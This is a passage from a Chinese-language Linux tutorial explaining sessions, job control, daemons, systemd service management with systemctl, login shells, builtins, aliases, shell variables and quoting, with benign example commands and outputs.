内核可对进程组中的所有成员执行各种动作，尤其是信号的传递，支持任务控制的shell会利用这一特性，以挂起或恢复进程组中的所有进程。

## 会话

在 Linux 系统中，多个用户可以同时登录系统。同一个用户也可以通过不同的终端建立多个独立的登录环境。每次登录都会启动相应的 Shell，并可能产生多个进程。这些进程需要被组织和管理，同时不同登录环境中的进程也需要相互区分。

前面介绍的进程组可以将多个相关进程组织在一起，但它描述的是一组进程之间的关系，并不能表示这些进程属于哪一次登录。为此，Unix 引入了会话（Session）的概念。

会话可以理解为对一次独立登录环境的进程组织抽象。它将属于同一会话的进程组组织在一起，使系统能够区分不同登录环境，并为终端管理和进程控制提供明确的范围。

会话通过会话 ID（Session ID，SID）进行标识。每个会话都有一个会话首进程（Session Leader）。创建新会话的进程会成为该会话的首进程，其进程 ID（PID）同时也是会话 ID（SID）。会话首进程同时也是一个新进程组的组长。因此，在新会话刚刚创建时，会话首进程的 PID、进程组 ID（PGID）和会话 ID（SID）相同。在终端中执行：

```bash
ps -p $$ -o pid,ppid,pgid,sid,tty,stat,cmd
 PID    PPID    PGID     SID TT       STAT COMMAND
 1234    1200    1234    1234 pts/0    Ss   bash
 
```

这里的 `$$` 表示当前 Shell 的进程 ID，`-o` 用于指定需要显示的进程信息。

了解了会话之后，还需要介绍一个与会话密切相关的概念：控制终端。在交互式 Linux 环境中，一个会话通常与某个终端设备相关联。这个与会话建立控制关系的终端设备，称为**控制终端（Controlling Terminal）**，简称 CTTY。例如，用户打开一个终端模拟器。终端模拟器通常通过伪终端（PTY）为 Shell 提供终端接口。假设对应的终端设备为：

```text
/dev/pts/3
```

当这个终端设备与 Shell 所属的会话建立控制关系后，/dev/pts/3 就成为该会话的控制终端。控制终端不是一种新的终端设备，也不是一个独立的进程。它指的是终端设备与会话之间建立的一种关联关系。

这种关系有两个重要限制：

1. 一个会话最多只能拥有一个控制终端，也可以没有控制终端。
2. 一个终端设备最多只能成为一个会话的控制终端。

同一会话中的所有进程组都共享这个控制终端。可以使用 `tty` 命令查看当前标准输入所连接的终端设备：

```bash
$tty
/dev/pts/3
```

这表示当前标准输入连接到了 /dev/pts/3。再结合前面介绍的 `ps` 命令：

```bash
ps -p $$ -o pid,sid,tty,comm
```

可以观察当前 Shell 所属的会话以及它的控制终端。

这里有一个细节：`tty` 显示的是标准输入连接的终端，而 `ps` 的 `TTY` 字段显示的是进程的控制终端。

在普通交互式 Shell 中，两者通常一致，但在重定向等情况下可能不同。另外，并不是所有会话都必须拥有控制终端。一些后台服务或守护进程所在的会话就可能没有控制终端，此时 `ps` 的 TTY 字段通常显示为 `?`。

前面提到，会话可以拥有一个控制终端，但新创建的会话最初并没有控制终端。那么，会话如何获得控制终端？

在 Linux 中，会话首进程首次打开一个尚未成为其他会话控制终端的终端设备时，通常会将该终端建立为当前会话的控制终端。程序也可以选择不通过打开操作建立这种关联。这里需要区分两个概念：

- 打开终端设备：进程获得了访问终端设备的能力。
- 建立控制终端：终端设备与进程所属的会话建立控制关系。

在日常使用中，用户通常不需要手动建立这种关系。例如，当用户打开终端模拟器时，终端模拟器会创建伪终端，并安排 Shell 在相应的会话中运行。终端与会话之间的控制关系通常在 Shell 启动之前就已经建立。因此，我们打开一个新的终端窗口时，通常也就获得了一个新的终端交互环境及其对应的会话。

建立控制终端之后，会话首进程同时成为该终端的控制进程（Controlling Process）。控制进程通常就是会话首进程。为什么需要关注这个进程呢？因为终端连接可能发生断开。

例如，用户关闭终端模拟器窗口。对于伪终端而言，终端模拟器通常会关闭伪终端主设备，内核由此检测到终端连接已经挂断。在通常的终端挂断情形下，内核会向会话首进程发送 SIGHUP 信号，表示终端挂断信号。SIGHUP 的默认处理动作是终止进程。如果控制进程是交互式 Shell，那么关闭终端窗口通常会导致 Shell 收到 SIGHUP。Shell 还可能根据自身的作业控制规则，向它管理的相关进程发送 SIGHUP。因此，关闭终端窗口可能导致其中运行的程序终止。

## 前台进程组与后台进程组

现在，我们已经了解了会话和控制终端。一个会话可以包含多个进程组，而这些进程组可能共享同一个控制终端。那么，当用户在终端中输入内容时，系统应该将输入交给哪个进程组处理？

为了解决这个问题，终端引入了前台进程组（Foreground Process Group）的概念。一个控制终端在同一时刻最多只能有一个前台进程组。该进程组负责当前的终端前台交互。同一会话中的其他进程组则处于后台状态，称为后台进程组（Background Process Group）。前台进程组和后台进程组并不是两种不同类型的进程组，而是根据进程组与控制终端之间的关系进行的区分。

例如，用户打开终端并启动交互式 Shell 后，Shell 所在的进程组通常就是该终端的前台进程组。当 Shell 启动其他命令时，可以为这些命令建立新的进程组，并根据命令的运行方式决定是否将其设置为前台进程组。

前台进程组和后台进程组不仅决定终端控制字符作用于哪些进程，还决定进程如何访问控制终端。终端对后台进程组的访问有一定限制，主要涉及两种情况：读取终端输入和向终端写入数据。

当后台进程组中的进程尝试从控制终端读取数据时，终端驱动程序会向该进程组发送 SIGTTIN 信号。该信号的默认处理动作是暂停进程组中的进程。

因此，后台进程组不能直接从控制终端读取用户输入。与读取操作不同，Linux 默认允许后台进程向控制终端写入数据。

## 作业控制

前面介绍了前台进程组和后台进程组。它们决定了同一个会话中的不同进程组如何使用控制终端。Shell 利用这些机制管理用户启动的命令，并提供了作业控制（Job Control）功能。

在 Shell 中，作业（Job）是用于管理命令及其运行状态的概念。一个作业通常对应一个进程组，可以包含一个或多个进程。例如，简单命令通常只包含一个进程，而通过管道连接的多个命令则通常包含多个进程。

作业控制允许用户将命令放在前台或后台运行，也可以暂停正在运行的命令，并在需要时恢复执行。

例如执行 `ping` 命令，此时，命令在前台运行，Shell 会等待命令结束，暂时不再接受新的命令输入：

```bash
$ping 8.8.8.8
```

按下 **Ctrl+C**，终端驱动程序向前台进程组发送 SIGINT信号。默认情况下，接收到 SIGINT 的进程会终止。因此，当一个命令在前台运行时，按下 Ctrl+C 通常可以中断这个命令。需要注意，SIGINT 是发送给整个前台进程组的，而不是只发送给某一个进程。进程也可以捕获或忽略这个信号，因此并不是所有命令都会立即终止。

如果不希望结束当前命令，只是暂时停止它的运行，可以按下 **Ctrl+Z**，默认情况下，接收到该信号的进程会暂停执行，但不会退出，此时，`ping` 命令并没有结束，而是处于暂停（T)状态，Shell 重新获得终端的前台使用权，并显示命令提示符：

```bash
$ping 8.8.8.8
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.

^Z
[1]+  Stopped                 ping 8.8.8.8
```

按下 **Ctrl+Z** 后，Shell 会记录这个作业及其当前状态。可以使用 `jobs` 命令查看当前 Shell 管理的作业：

```bash
$jobs
[1]+  Stopped                 ping 8.8.8.8
```

其中：

- [1] ：表示作业编号为 1。
- +：表示当前 Shell 的默认作业。
- Stopped：表示该作业处于暂停状态。

如果希望查看作业对应的进程 ID，还可以使用：

```bash
$jobs -l
[1]+ 105294 Stopped                 ping 8.8.8.8
```

如果希望它继续运行，但不再占用终端的前台使用权，可以使用 `bg` ( Background )命令,用于让暂停的作业在后台继续运行,这里的 `%1` 表示作业编号为 1 的作业:

```bash
$bg %1
```

执行后，Shell 会将该作业放到后台，并使其恢复运行。这里涉及另一个SIGCONT信号。它是继续信号，用于让处于停止状态的进程恢复执行。`bg` 在恢复暂停的作业时，会向相应的进程组发送 SIGCONT。

> [!NOTE]
>
> 这里你将会碰到奇怪的事情，ping命令在不断的输出，这里在使用ctrl+c 或者ctrl+z 已经对它不起任何的作用。请结合之前的内容，思考这里发生了什么？

```bash
$jobs -l
[1]+ 105600 Running                 ping 8.8.8.8 > /dev/null &
```

此时，`ping` 命令已经从 Stopped 状态恢复为 Running 状态，但它仍然在后台运行。

> [!NOTE]
>
> 为了能正常的输入命令，这里我使用了重定向执行了ping命令

如果希望重新在终端中操作一个后台作业，可以使用 `fg` （Foreground ）命令，用于将指定作业切换到前台：

```bash
$fg %1
ping 8.8.8.8 > /dev/null
```

执行后，Shell 会将终端的前台使用权交给对应的进程组。如果该作业原本处于运行状态，它会继续在前台运行；如果该作业原本处于暂停状态，Shell 则会发送 SIGCONT，使其恢复运行。

如果一开始就希望命令在后台运行，在命令末尾添加 `&`，Shell 就会将该命令放在后台运行，并立即返回命令提示符：

```bash
 $ping 8.8.8.8 &
[1] 105086
```

需要注意，使用 `&` 并不意味着命令与终端完全脱离。如果后台命令尝试从控制终端读取数据，通常会收到 SIGTTIN 信号并暂停。

如果希望让在后台运行的进程组暂停运行，可以使用`kill`命令发送暂停信号：

```bash
$kill -STOP %1
```

也可以使用`kill`命令让它继续执行：

```bash
kill -CONT %1
```

## 守护进程

前面介绍了如何将命令放入后台运行。通过在命令末尾添加 `&`，Shell 可以在后台启动一个进程，而不必等待它执行完毕。

但是，这种后台运行方式仍然依赖当前的终端会话。进程通常仍然属于当前会话，并且可能与控制终端保持关联。当用户退出 Shell 或关闭终端时，这些进程可能受到终端挂断信号的影响。

对于一些需要长期运行的系统服务来说，这显然不够理想。例如，SSH 服务需要持续监听网络连接，定时任务服务需要按照计划执行任务，系统日志服务需要持续收集和记录日志。这些程序不应该依赖某个用户是否打开了终端，也不应该随着某次登录结束而退出。为此，Unix 系统引入了**守护进程（Daemon）**的概念。

守护进程是一类长期在后台运行、独立于用户终端交互的进程，通常用于提供系统服务或其他持续运行的功能。常见的守护进程包括：

- sshd：提供 SSH 远程登录服务。
- cron：负责执行周期性计划任务。
- systemd-journald：负责收集和管理系统日志。
- dbus-daemon：提供进程间通信服务。

守护进程与普通交互式进程相比，有几个典型特点：

1. **长期运行**：守护进程通常不会因为某个命令执行完毕而退出，而是持续运行，等待外部事件或请求。例如，SSH 服务启动后，会持续监听网络连接，直到服务被停止或系统关闭。
2. **独立于终端**：守护进程不依赖用户打开的终端工作，通常没有控制终端。因此，即使用户退出登录或关闭终端窗口，守护进程也不会因此受到终端挂断的影响。

3. **在后台提供服务**：守护进程通常不需要用户直接输入命令来控制其工作，而是通过网络请求、定时任务、系统事件或其他进程的请求提供服务。
4. **通常由系统统一管理**：在现代 Linux 中，守护进程通常由系统服务管理器负责启动、停止、重启和监控。例如，systemd 可以管理 SSH、定时任务和系统日志等服务。

传统 Unix 守护进程通常需要在启动时完成一系列初始化工作，使自己不再依赖原来的终端环境。其主要目的包括：脱离原来的登录会话、不再拥有原终端作为控制终端、关闭或重新处理继承来的文件描述符、将工作目录调整到合适的位置、设置适当的文件创建权限掩码。经过这些处理，进程就可以独立于原来的终端环境长期运行。**脱离终端并不意味着进程不再属于任何会话或进程组**。它仍然属于某个会话和进程组，只是不再依赖用户的控制终端。

## 从守护进程到系统服务管理

随着 Linux 系统的发展，需要长期运行的程序越来越多。一台服务器可能同时运行 SSH 服务、Web 服务、数据库服务、日志服务和定时任务服务。这些程序虽然都可以作为守护进程运行，但仅仅让它们在后台启动还不够。系统还需要解决一系列管理问题：

- 系统启动时，应该启动哪些程序？
- 某个服务启动失败后，是否需要重新启动？
- 如何统一停止、重启和查看服务状态？
- 如何记录服务运行期间产生的日志？
- 不同服务之间存在依赖关系时，应该按照什么顺序启动？

如果完全依靠管理员手动启动和管理这些进程，维护成本会非常高。因此，Linux 需要一个专门的系统管理程序，负责系统初始化以及各种服务进程的生命周期管理。在现代 Linux 发行版中，最常见的实现就是 **systemd**。

systemd 是现代 Linux 主流的初始化系统与服务管理器。 Linux 内核启动完成后，会拉起第一个用户空间进程，使用 systemd 的发行版里它的 PID 就是 1。 systemd 从这里开始负责系统初始化，并根据系统配置启动相应的服务程序和其他系统资源。systemd 不只是负责启动这些服务程序，还会跟踪它们的运行状态，并根据配置处理服务退出、重启和依赖关系等问题。

那么，systemd 是如何知道应该启动哪个程序、使用什么参数，以及如何管理它的呢？

systemd 使用 **Unit（单元）** 作为基本的管理对象。Unit 描述了 systemd 需要管理的资源、任务或运行状态。systemd 根据相应的 Unit 配置，决定如何启动、停止和管理这些对象，以及它们之间存在什么依赖关系。不同的管理对象具有不同的类型，因此 Unit 也有不同的类型，常见的类型包括：

| 类型     | 用途                                     |
| -------- | ---------------------------------------- |
| .service | 管理服务进程                             |
| .socket  | 管理套接字及相关监听接口                 |
| .timer   | 管理定时任务                             |
| .target  | 将多个 Unit 组织在一起，形成一个管理目标 |
| .mount   | 管理文件系统挂载                         |
| .device  | 表示和管理设备                           |

例如，SSH 服务可以由一个 .service 单元管理，定时执行的任务可以通过 .timer 单元管理，而系统启动时需要达到的某种运行状态，则可以通过 .target 单元组织。这些 Unit 并不都是进程。有些代表服务进程，有些代表定时任务、挂载点或设备。对于当前的进程章节，我们重点了解最常见的 .service 单元。

`systemctl` 命令是 systemd 提供的命令行管理工具。它负责向 systemd 管理器发送操作请求，使用户能够查看和管理 Unit。

例如，查看当前已经加载到内存的服务单元，使用空格键翻页，使用enter键或方向下键逐行查看，按q退出：

```bash
$systemctl list-units --type=service
  UNIT                                     LOAD   ACTIVE SUB     DESCRIPTION
  docker.service                           loaded active running Docker Application Container Engine
  fail2ban.service                         loaded active running Fail2Ban Service
  ssh.service                              loaded active running OpenBSD Secure Shell server
```

UNIT列表示单元的全名，systemd可以使用点号前的名字来管理，也可以使用带类型的全名进行管理。

LOAD：配置文件是否成功加载进内存，加载状态的值和意义如下：

- loaded：正常读到、解析 unit 文件 
- not-found：找不到 unit 文件
- bad-setting：配置语法错误
- error：加载失败
- masked：被屏蔽（mask），不能启动

ACTIVE：激活状态，表示这个单元 “目标有没有达成”，常见值和意义如下：

- active：正常激活
- inactive：未激活、停止
- activating：正在启动
- deactivating：正在停止
- reloading：正在重载配置
- failed：失败（崩溃、退出码错误、超时）

SUB：子状态，表示该单元现在是以哪种形态达成 / 未达成这个目标。值随 unit 类型变化，对于服务单元常见的值和意义为：

- running：服务进程正在跑
- exited：一次性任务执行完毕（oneshot）
- failed：失败
- dead：已经退出

还有很多单元的子状态，如果某个单元出现了问题，在命令的输出中有非常明显的颜色标记。

如果需要查看磁盘上所有关于服务的 unit 文件，可以通过以下的命令：

```bash
$systemctl list-unit-files --type=service
UNIT FILE                                    STATE           PRESET
2ping.service                                disabled        enabled
accounts-daemon.service                      enabled         enabled
alsa-restore.service                         static          -
display-manager.service                      alias           -
```

STATE 列表示当前开机启用状态，常见的值如下：

- enabled：已启用，开机自动启动
- disabled：开机不启动
- static：不能手动启用；只能被别的单元依赖拉起
- indirect：本单元本身不启用，靠模板实例别名间接启用
- masked：被屏蔽，手动、自动都启动失败
- alias：这个单元本身只是一个别名符号链接，指向另一个真正的 unit 文件
- linked：unit 文件不在 systemd 默认单元目录（/usr/lib/systemd/system、/etc/systemd/system），而是通过符号链接从别的自定义路径引入
- enabled-runtime：运行时启用，只在当前内存生效，不写到磁盘
- masked-runtime：运行时屏蔽，临时屏蔽，重启失效

PRESET 这一列表示厂家的预设规则，例如：

- **enabled**：厂商预设默认启用
- **disabled**：厂商预设默认关闭
- 空：表示没有预设值

可以通过以下的命令查看实际加载生效的单元文件的完整配置：

```bash
$systemctl cat ssh
# /usr/lib/systemd/system/ssh.service
[Unit]
Description=OpenBSD Secure Shell server
Documentation=man:sshd(8) man:sshd_config(5)
After=network.target nss-user-lookup.target auditd.service
ConditionPathExists=!/etc/ssh/sshd_not_to_be_run

[Service]
EnvironmentFile=-/etc/default/ssh
ExecStartPre=/usr/sbin/sshd -t
ExecStart=/usr/sbin/sshd -D $SSHD_OPTS
ExecReload=/usr/sbin/sshd -t
ExecReload=/bin/kill -HUP $MAINPID
KillMode=process
Restart=on-failure
RestartPreventExitStatus=255
Type=notify
RuntimeDirectory=sshd
RuntimeDirectoryMode=0755

[Install]
WantedBy=multi-user.target
Alias=sshd.service
```

一个服务单元通常由几个部分组成：

[Unit]：描述单元及其关系

[Service]：描述服务如何运行，这是服务单元最重要的部分之一

[Install]：这一部分描述单元在执行 启用 操作时，应该与哪些目标建立关联

> [!NOTE]

可以通过以下命令查看单元文件的具体文件位置：

```bash
$systemctl show -p FragmentPath ssh
FragmentPath=/usr/lib/systemd/system/ssh.service
```

systemd 的单元文件分布在多个目录：软件包自带单元放在 /usr/lib/systemd/system（Debian 为 /lib/systemd/system）；管理员自定义单元放在 /etc/systemd/system；/run/systemd/system 用于存放临时过渡单元。systemd 以宏观角度看待这些目录，将它们纳入同一个查找空间；同名单元发生冲突时，/etc 优先级最高。单元文件名带有后缀，用来标识单元类型，如 .service、.timer。

> [!NOTE]
>
> 不建议现阶段再深入了解，大概知道就可以了

是时候来使用 `systemctl` 命令管理这些服务了，前面介绍了当前已经加载的服务单元，如果只想查看正在运行的服务，可以添加`--state` 选项来过滤子状态：

```bash
$systemctl list-units --type=service --state=running
UNIT                LOAD   ACTIVE SUB     DESCRIPTION
cron.service        loaded active running Regular background program processing daemon
```

查看服务之后，最常见的操作就是改变服务的运行状态。

启动服务：

```bash
$sudo systemctl start ssh.service
```

停止服务：

```bash
$sudo systemctl stop ssh.service
```

重启服务：

```bash
$sudo systemctl restart ssh.service
```

如果服务支持重新加载配置，还可以使用：

```bash
$sudo systemctl reload ssh.service
```

这里需要区分 `reload` 和 `restart`：

- `reload`：要求服务重新读取配置，通常不会重新创建服务进程。
- `restart`：停止当前服务，再重新启动服务。

并不是所有服务都支持 `reload`。如果服务没有实现相应的重新加载机制，该操作就无法使用。

如果希望某个服务在系统下次启动时自动启动，则需要使用 `enable`：

```bash
$sudo systemctl enable ssh.service
```

使用`disable`可以取消开机自动启动：

```bash
$sudo systemctl disable ssh.service
```

如果希望立即启动服务，同时设置开机自动启动，可以使用：

```bash
$sudo systemctl enable --now ssh.service
```

相应地可以取消开机启动设置，并立即停止服务：

```bash
$sudo systemctl disable --now ssh.service
```

通过指定`mask` 选项，该选项通过创建指向 /dev/null 的符号链接屏蔽单元；屏蔽后的单元无法手动启动，也不能被其他单元依赖触发激活，比 `disable` 的限制更强：

```bash
$sudo systemctl mask ssh.service
```

mask 不会自动停止已经正在运行的进程,如果服务处于运行状态，mask 之后它不会立刻停止；想要同时停止，可以添加`--now` ，如果需要临时屏蔽，使用--runtime，表示本次开机屏蔽，重启自动恢复：

```bash
$sudo systemctl mask --now ssh.service
```

恢复则使用 umask选项：

```bash
$sudo systemctl unmask ssh.service
```

除了查看服务状态，还需要了解服务运行期间发生了什么。systemd 通常会配合 systemd-journald 收集和管理系统日志。这将在后面的日志章节介绍。

# 重新认识shell

## 登录shell

前面已经介绍过，Linux 中存在多种 Shell，例如 Bash、Zsh、Dash 等。不同 Shell 提供的命令语言、语法和交互功能并不完全相同。那么，当用户登录 Linux 系统时，系统如何知道应该启动哪个 Shell？

这个信息通常保存在 /etc/passwd 文件中。可以使用下面的命令查看当前用户的账户信息：

```bash
$getent passwd "$USER"
bob:x:1000:1003:bob:/home/bob:/bin/bash
```

/etc/passwd 中每条记录由冒号分隔，共包含七个字段：

| 字段       | 含义                   | 示例      |
| ---------- | ---------------------- | --------- |
| 用户名     | 账户名称               | bob       |
| 密码占位符 | 密码信息存放位置       | x         |
| UID        | 用户 ID                | 1000      |
| GID        | 主组 ID                | 1000      |
| 注释信息   | 用户描述               | bob       |
| 家目录     | 用户的主目录           | /home/bob |
| 登录 Shell | 用户登录时使用的 Shell | /bin/bash |

最后一个字段就是登录 Shell（Login Shell）的可执行文件路径。当用户通过正常的登录流程进入系统时，登录程序会根据账户信息启动相应的 Shell。可以查看该可执行文件的信息：

```bash
$ll /bin/bash
-rwxr-xr-x 1 root root 1.3M Jul 12 12:58 /bin/bash
```

如果希望修改当前账户使用的登录 Shell，可以使用 `chsh` 命令，指定另外一个存在的shell程序：

```bash
$chsh -s /bin/zsh
```

如果仔细观察/etc/passwd 文件，可能会发现一些账户的登录 Shell 并不是 /bin/bash，而是如下的值：

```bash
redis:x:107:108::/var/lib/redis:/usr/sbin/nologin
mysql:x:101:102:MariaDB Server:/nonexistent:/bin/false
```

为了演示，先尝试直接在命令行中直接运行/bin/bash的效果,首先查看当前的进程id，然后执行/bin/bash 可执行文件，之后再次查看当前进程id，对比id值可以发现并不是同一个id值，通过执行`pstree`命令查看当前进程树，可以看到我们当前在另外的一个bash中交互式的执行了`pstree`命令：

```bash
$echo $$
190237

$/bin/bash
$echo $$
218864

$pstree -acp
  ├─sshd,844
  │   └─sshd-session,190171
  │       └─sshd-session,190213
  │           └─bash,190237
  │               └─bash,218864
  │                   └─pstree,218902 -acp

```

输入`exit`命令可以从当前的bash中退出。

而运行这两个/usr/sbin/nologin和/bin/false 程序：

```bash
$/usr/sbin/nologin
This account is currently not available.
$ echo $?
1

$/bin/false
$echo $?
1
```

这两个程序执行后，马上就退出了，并接收到他们的退出码，这两个程序根本无法交互式的输入命令！

在进程这一章节中已经提及每个进程都有一套用数字表示的用户ID（UID）和组ID(GID)作为进程的凭据，这些凭据参与文件访问控制和其他权限检查。如果 systemd 直接以默认权限启动这些系统服务，并且没有另外指定运行身份，那么服务进程通常会以 root 身份运行。这意味着，这些服务可能拥有非常高的系统权限。一旦其中某个服务存在漏洞，攻击者就可能直接获得 root 权限。

> [!NOTE]
>
> root 代表linux上最高权限的账户，和windows上的管理员账户administrator进行对比，root比它权限还要高，将在用户管理和权限章节介绍

因此，在部署服务时，通常会根据服务的功能和权限需求，为其创建专用的系统账户和用户组，使服务进程以独立的身份运行。这些账户通常由软件包安装过程创建，或者由系统管理员根据实际需要配置。而这些账户不需要提供交互式登录环境进行登录，对于这类账户，管理员可以将其登录 Shell 设置为/usr/sbin/nologin或/bin/false ，明确表示不允许通过正常的登录流程获得交互式 Shell。

## /etc/shells文件

/etc/shells文件记录系统认可的 Shell 路径，查看它的内容：

```bash
$cat /etc/shells
# /etc/shells: valid login shells
/bin/sh
/usr/bin/sh
/bin/bash
/usr/bin/bash
/bin/rbash
/usr/bin/rbash
/usr/bin/dash
/usr/bin/screen
/usr/bin/tmux

$ll /etc/shells
-rw-r--r-- 1 root root 148 Oct  1 07:07 /etc/shells
```

它主要用于列出系统认可的登录 Shell。一些程序会通过这个文件判断某个 Shell 是否属于有效的登录 Shell。这个文件一般用户无法修改。

## 内部命令与外部命令

在进程这一章节中提到，当shell执行命令时，会创建一个子进程来运行该命令的可执行文件，在命令行中可以通过`which`命令来展示 命令对应的可执行文件的绝对路径，例如查看 `ls` 命令对应的绝对路径：

```bash
$which ls
/bin/ls
```

但是查看`cd`命令时，并没有任何的输出而且还抛出了不为0的退出码，比如：

```bash
$which cd

$echo $?
1
```

> [!NOTE]
>
> $?变量存储上一条命令的退出状态码

因为cd命令属于shell程序的一部分，不需要通过查找外部可执行文件来启动。可以使用`type`命令来区分内部命令和外部命令，例如：

```bash
$type cd
cd is a shell builtin

$type cat
cat is hashed (/bin/cat)
```

常见的内置命令包括：

|          | 作用                          |
| -------- | ----------------------------- |
| `cd`     | 改变当前工作目录              |
| `pwd`    | 显示当前工作目录              |
| `echo`   | 输出文本                      |
| `read`   | 从标准输入读取数据            |
| `export` | 设置变量的导出属性            |
| `unset`  | 删除变量或函数                |
| `alias`  | 定义命令别名                  |
| `source` | 在当前 Shell 中读取并执行文件 |
| `exit`   | 退出当前 Shell                |
| `jobs`   | 查看当前 Shell 管理的作业     |

### historty命令

`historty`命令一个实用的内部命名，能帮助你管理先前执行过的命令，比如查看最近用过的命令列表：

```bash
$history
    1  ip a
    2  ssh
    3  ipconfig
```

使用两个感叹号，可以直接使用上一个命令，也可以感叹号加上输出的命令编号，如下所示：

```bash
$!!
ifconfig

$!1
ip a
```

命令历史记录被保存在位于用户家目录的隐藏文件.bash_history之中： 

```bash
$ls -la ~/.bash_history
-rw------- 1 bob bob 10057 Nov  9 18:07 /home/bob/.bash_history
```

会话期间，bash命令的历史记录被保存在内存中，当shell退出时 才被写入历史文件。可以使用`history` 命令的`-a`选项，强制将命令历史记录写入.bash_history 文件。如果要清空历史命令记录，可以使用`-c`选项，但它清除的只是内存中的命令历史，需要结合`-a`选项来写出到.bash_history 文件。

```bash
 $history -c
 $history -a
```



##  别名

通过`type`命令查看命令的类型时，有一个很奇怪的输出：

```bash
$type ls
ls is aliased to `ls --color=auto'

```

这就是别名的功能，当你在命令行中执行`ls`命令时，实际上是执行的带参数的`ls --color=auto`命令，这个功能很方便，比如命令的某个选项是必须要的，而又每次都需要输入的时候。

别名可以使用 `alias` 命令来定义，比如一个有趣的实验，将`rm`命令通过别名，执行另外一个命令：

```bash
$alias rm='echo "HELLO"'

$rm deit.txt
HELLO deit.txt
```

删除别名，可以使用 `unalias` 命令：

```bash
$unalias rm

```

查看所有定义的别名，可以直接使用alias命令：

```bash
$alias
alias ..='cd ..'
alias ...='cd ../..'
alias ....='cd ../../..'
alias .....='cd ../../../..'
alias ......='cd ../../../../..'
alias _='sudo'
alias _i='sudo -i'
alias dir='dir --color=auto'
alias grep='grep --color=auto'
alias l='ls -CF'
alias la='ls -lha'
alias ll='ls -lh'
alias ls='ls --color=auto'
```

如果需要执行原来的可执行文件，而不是别名后的命令，可以使用程序文件的绝对路径或者相对路径，或者添加反斜杠，例如`\ls`命令，这将调用执行原始的ls程序：

```bash
$\ls
```

## 变量

在 Bash 中，变量用于保存数据，供当前 Shell 后续使用。与许多编程语言不同，Bash 不要求在定义变量时声明数据类型，也不需要预先指定变量的存储方式。用户可以直接通过赋值语句创建变量。它的变量与 C、Python 等编程语言中的变量有明显区别，普通 Bash 标量变量主要保存文本值。并不会因为写入数字或者 true 就自动获得整数、浮点数或布尔类型。

### 定义和赋值

Bash 使用等号 = 为变量赋值。变量不存在时，赋值操作会创建变量；变量已经存在时，则会更新它的值。**注意等号两侧不能有空格**，因为 Bash 会根据空格划分命令中的不同部分。name = bob不会被解释为变量赋值，而会被当作一条命令及其参数进行处理：

```bash
name=bob
wordlist=’/var/wordlist/rockyou.txt'
passwd="123456"
```

变量名命名规则如下：

- 只能字母、数字、下划线，不能数字开头
- 区分大小写：Name 和 name 是两个变量
- 不要和内置关键字重名

在赋值时，等号右侧的内容会按照 Shell 的语法进行解释。对于简单的字符串，可以直接赋值；但如果变量值包含空格，就需要使用单引号或双引号包裹。

### 使用变量

定义变量之后，可以通过变量名读取其中保存的内容，变量值可以使用美元符号加变量名来引用，例如使用`echo`命令输出变量的值：

```bash
$name=bob
$echo $name
bob

```

> [!NOTE]
>
> $name=bob，这里的$ 是shell自己的提示符，不是输入进去的，注意区分

可以使用花括号明确变量名称的边界，在实际使用中推荐这种写法来减少变量名称识别歧义：：

```bash
$echo ${name}
bob
```

可以使用双引号 包裹来引用变量：

```bash
$name=bob

$echo "$name"
bob
$echo "${name}"
bob
```

使用变量背后发生了一些列的事情：shell 在执行命令之前，扫描整条命令，把 `$name`、`${name}` 替换成变量里面存的值，这个过程就叫变量展开，也叫变量替换。其他复杂的变量展开在后续介绍。

### 修改和删除变量

变量的值可以随时修改，例如：

```bash
$name=bob
$name=alice
$echo $name
alice
```

如果不再需要某个变量，可以使用 `unset` 命令删除：

```bash
$unset name
```

删除之后，再次引用该变量，会得到空字符串（空格不是空字符！）。

### 引号

在 Bash 中，空格、美元符号、星号和反斜杠等字符都具有特殊含义。例如，空格通常用于分隔命令中的不同部分，美元符号用于引用变量，星号可以用于匹配文件名。但在实际使用中，我们经常需要将这些字符作为普通文本处理，而不是让 Bash 执行它们原本的语法功能。例如下面的命令中星号会被shell提前解析并为文件名通配符，他将输出当前工作目录的所有文件和文件夹：

```bash
$echo *
attackbox Desktop Documents Downloads
```

告诉shell不要提前解析最直接的方式就是使用引号。

#### 单引号

单引号用于保留其中字符的字面含义：

```bash
$echo '*'
*
```

使用**单引号**包裹后，内部的字符都会按照字面含义处理，**不会发生变量展开、命令替换和文件名展开**。这使得单引号特别适合用于需要原样传递的文本。

需要注意，单引号内部不能直接再包含一个单引号，因为单引号本身就是用于界定引用范围的字符：

```bash
$echo 'let's go'
> '
lets go

```

在shell分析命令语法不完整时，会出现> 符号提示继续完善命令，尝试分析这里发生了什么？

#### 双引号

双引号同样可以将多个字符组织成一个整体，但它与单引号有一个重要区别：**双引号内部允许进行变量展开、命令替换和算术展开。**

例如之前介绍使用变量时，可以使用双引号包裹，这里发生了变量展开：

```bash
$name=bob
$message="Hello, $name"

$echo "$message"
Hello, bob
```

那么，为什么不直接使用不带引号的变量引用？例如：

```bash
$name=bob
$echo Hello $name
Hello bob
```

在之前介绍文件名的规则时，不建议使用空格，但如果创建一个带空格的文件，如下面的命令所示：

```bash
$FILE_NAME='admin passwd.txt'

$touch $FILE_NAME
$ls -l
total 0
-rw-rw-r-- 1 bob bob 0 Nov  9 16:23 admin
-rw-rw-r-- 1 bob bob 0 Nov  9 16:23 passwd.txt

$touch "$FILE_NAME"
$ll
total 0
-rw-rw-r-- 1 bob bob 0 Nov  9 16:24 'admin passwd.txt'
-rw-rw-r-- 1 bob bob 0 Nov  9 16:23  admin
-rw-rw-r-- 1 bob bob 0 Nov  9 16:23  passwd.txt
```

将一个带空格的文件名赋值给变量FILE_NAME，然后`touch` 命令使用这个变量，在命令开始执行之前，shell解析全部的命令，进行命令展开，展开后如下：

```bash
$touch admin passwd.txt
```

受到IFS的影响，`touch`命令实际接受到两个参数，所以创建了两个文件。

而使用双语引号包裹变量时，命令展开后不再做单词分割，值直接传递给命令。

双引号还有一个重要作用：阻止变量展开结果再次被当作文件名通配符处理。

### IFS

前面介绍了双引号的作用。当变量值包含空格时，如果没有使用双引号，Bash 可能会将变量展开后的内容分割成多个参数。这种处理称为单词分割（Word Splitting）。

但为什么需要单词分割？

有个知识点没有一直提及，Bash 执行命令时，需要识别命令名称以及传递给命令的各个参数，比如：

```bash
$ls -l /home
```

之前所有的命令都遵守这个格式，在命令和各个参数之间添加空格。

但并不是所有命令参数都直接写在命令行中。有时，参数来自变量的值。例如：

```bash
$files="file1.txt file2.txt file3.txt"
```

变量 `files` 保存了一段包含三个文件名的文本。如果希望将这三个文件名分别作为参数传递给 `ls`，就需要将变量展开后的内容划分为三个独立的字段：

```bash
$ls $files
```

